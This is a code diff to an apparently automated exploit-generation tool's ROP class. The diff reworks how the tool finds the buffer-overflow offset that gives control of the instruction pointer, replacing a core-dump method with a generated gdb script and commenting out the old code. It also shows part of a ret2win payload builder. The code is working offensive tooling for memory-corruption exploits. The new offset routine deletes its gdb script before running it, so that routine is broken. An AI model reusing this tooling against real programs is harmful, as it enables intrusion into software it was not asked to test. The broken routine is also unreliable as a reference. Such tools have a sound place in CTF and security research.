@@ -22,7 +22,7 @@ class ROP:
         self.e = ELF(self.filename)
         self.gadgets = []
         self.find_gadgets()
-        self.libc = "/opt/libc.so.6"
+        self.libc = "./docker/libc/libc.so.6"
         self.p = p
 
         self.fart_print.info("Buffer overflow likely!")
@@ -68,27 +68,43 @@ class ROP:
             self.fart_print.warning("Exploit not found!")
         
         return payload
-    
+
     def set_offset(self):
         self.fart_print.info("Attempting to find the offset to control the instruction pointer")
         attempts = 0
         try:
-            p = process(self.filename)
-            p.sendline(cyclic(500, n=8))
-            
-            time.sleep(1)
-            core = Coredump(f"./core_files/core.{p.pid}")
-            time.sleep(1)
-            os.remove(f"./core_files/core.{p.pid}")
-            time.sleep(1)
-            offset = cyclic_find(core.read(core.rsp, 8), n=8)
-            
-            p.close()
-            return b'A'*offset
-        # TODO: catch all exceptions and run symbolic analysis as a last ditch effort
+            gdb_file_cont = "file "+self.filename+"\nrun <<< " + cyclic(85).decode("utf-8") + "\nprint $rbp"
+            gdb_file_name = str(random.randint(100000000000,999999999999))+".gdb"
+            with open(gdb_file_name, 'w') as file: file.write(gdb_file_cont)
+            os.remove(gdb_file_name)
+            return b"A"*(cyclic_find(p64(int(subprocess.run(["gdb", "-x", gdb_file_name, "-batch"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout.strip().split(' ')[-1],16)))+8)
         except:
             self.fart_print.warning("Dynamic overflow failed! Attempting symbolic analysis")
             return Get2overflow(self.filename, self.v_lvl).buf()
+
+#    def set_offset(self):
+#        self.fart_print.info("Attempting to find the offset to control the instruction pointer")
+#        attempts = 0
+#        try:
+#            p = process(self.filename)
+#            p.sendline(cyclic(500, n=8))
+#            
+#            time.sleep(1)
+#            core = Coredump(f"./core_files/core.{p.pid}")
+#            time.sleep(1)
+#            os.remove(f"./core_files/core.{p.pid}")
+#            time.sleep(1)
+#            offset = cyclic_find(core.read(core.rsp, 8), n=8)
+#            
+#            p.close()
+#            return b'A'*offset
+#        # TODO: catch all exceptions and run symbolic analysis as a last ditch effort
+#        except:
+#            self.fart_print.warning("Dynamic overflow failed! Attempting symbolic analysis")
+#            return Get2overflow(self.filename, self.v_lvl).buf()
+
+
+
 
     def ret2win(self, failed):
         self.fart_print.info("Crafting payload for ret2win")
